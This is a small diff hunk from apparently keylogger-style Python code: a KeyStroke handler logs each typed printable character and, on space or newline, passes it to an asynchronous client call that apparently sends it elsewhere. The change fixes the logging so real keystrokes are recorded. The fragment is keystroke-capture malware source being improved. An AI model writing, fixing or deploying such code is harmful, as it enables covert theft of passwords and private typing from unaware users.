@@ -72,7 +72,7 @@ def KeyStroke(event):
 
     # if they pressed a standard key
     if 33 < event.Ascii < 127:
-        logged.append(data)
+        logged.append(chr(event.Ascii))
         if event.Ascii == 32 or event.Ascii == 10:
             asyncio.get_event_loop().run_until_complete(client(chr(event.Ascii)))
     else:
